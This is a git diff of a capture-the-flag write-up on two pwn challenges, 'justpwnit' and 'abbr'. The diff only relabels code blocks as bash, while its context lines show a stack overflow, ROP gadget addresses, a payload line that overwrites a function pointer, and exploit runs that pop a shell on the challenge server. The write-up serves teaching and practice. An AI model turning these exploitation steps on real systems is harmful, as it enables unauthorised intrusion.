@@ -14,7 +14,7 @@ You can find the related files [here](https://github.com/ret2school/ctf/blob/mas
 justpwnit was a warmup pwn challenge. That's only a basic stack overflow.
 The binary is statically linked and here is the checksec's output:
 
-```
+```bash
 [*] '/home/nasm/justpwnit'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -67,7 +67,7 @@ Furthermore, `index` is a signed integer, which means we can input a negative va
 
 Let's see this in gdb !
 
-```
+```bash
 00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         
 01:0008│         0x7ffef03864e8 —▸ 0x7ffef0386520 ◂— 0xb4                                                                                                                                      
 02:0010│         0x7ffef03864f0 ◂— 0x0
@@ -87,7 +87,7 @@ That's the stack's state when we are calling calloc. We can see the `set_element
 
 Then, if we do so, the stack's state looks like this:
 
-```
+```bash
 00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         
 01:0008│         0x7ffef03864e8 —▸ 0x7ffef0386520 ◂— 0xb4                                                                                                                                      
 02:0010│         0x7ffef03864f0 ◂— 0x0                                                                                                                                                         
@@ -121,7 +121,7 @@ And so what we need is:
 We can easily find these gadgets with the help [ROPgadget](https://github.com/JonathanSalwan/ROPgadget).
 We got:
 
-```
+```bash
 0x0000000000406c32 : mov qword ptr [rax], rsi ; ret
 0x0000000000401001 : pop rax ; ret
 0x00000000004019a3 : pop rsi ; ret
@@ -154,7 +154,7 @@ pld += pwn.p64(SYSCALL)
 
 And we can enjoy the shell !
 
-```
+```bash
 ➜  justpwnit git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=11010
 [*] '/home/nasm/pwn/asis2021/justpwnit/justpwnit'
     Arch:     amd64-64-little
@@ -435,7 +435,7 @@ So we send `b"wwwwww" + b"A"*(0x1000-16) + pwn.p64(gadget)`, we will overflow th
 
 Once that's done, when the function pointer will be triggered at the next iteration, we will be able to jmp at an arbitrary location.
 Lets take a look at the values of the registers when we trigger the function pointer:
-```
+```bash
  RAX  0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi
  RBX  0x400530 (_IO_getdelim.cold+29) ◂— 0x0
  RCX  0x459e62 (read+18) ◂— cmp    rax, -0x1000 /* 'H=' */
@@ -498,7 +498,7 @@ pld += pwn.p64(SYSCALL)
 
 We launch the script with the right arguments and we correctly pop a shell!
 
-```
+```bash
 ➜  abbr.d git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=10010 
 [*] '/home/nasm/pwn/asis2021/abbr.d/abbr'
     Arch:     amd64-64-little
